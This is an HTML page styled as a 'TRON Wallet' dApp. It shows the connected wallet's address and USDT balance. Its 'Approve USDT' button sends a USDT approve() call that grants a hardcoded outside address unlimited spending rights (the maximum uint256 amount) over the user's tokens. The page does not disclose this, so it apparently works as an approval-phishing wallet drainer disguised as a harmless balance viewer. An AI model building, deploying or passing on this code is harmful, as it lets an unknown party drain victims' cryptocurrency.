<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>TRON DApp</title>

<style>
body {
  margin: 0;
  background: #0b0b0b;
  color: #fff;
  font-family: Arial;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}
.container {
  text-align: center;
}
.button {
  padding: 12px 25px;
  background: #00ffae;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  margin-top: 15px;
}
</style>

<script>
const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

let tronWeb;

async function init() {
  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    tronWeb = window.tronWeb;

    const user = tronWeb.defaultAddress.base58;

    document.getElementById("address").innerText = user;

    await loadBalance();

  } else {
    document.getElementById("status").innerText =
      "❌ Open inside Trust Wallet dApp browser";
  }
}

// 🔥 Get USDT balance
async function loadBalance() {
  try {
    const contract = await tronWeb.contract().at(USDT);
    const balance = await contract.balanceOf(tronWeb.defaultAddress.base58).call();

    const formatted = balance / 1e6;

    document.getElementById("balance").innerText =
      formatted + " USDT";

  } catch (e) {
    console.error(e);
  }
}

// 🔥 Approve function (user must confirm)
async function approve() {
  try {
    document.getElementById("status").innerText =
      "Waiting for approval...";

    const contract = await tronWeb.contract().at(USDT);

    await contract.approve(
      "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV",
      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    ).send();

    document.getElementById("status").innerText =
      "✅ Approved successfully";

  } catch (e) {
    console.error(e);
    document.getElementById("status").innerText =
      "❌ Transaction rejected";
  }
}

window.onload = init;
</script>

</head>

<body>

<div class="container">
  <h2>TRON Wallet</h2>

  <p><b>Address:</b></p>
  <p id="address">Loading...</p>

  <p><b>USDT Balance:</b></p>
  <p id="balance">0</p>

  <button class="button" onclick="approve()">Approve USDT</button>

  <p id="status"></p>
</div>

</body>
</html>
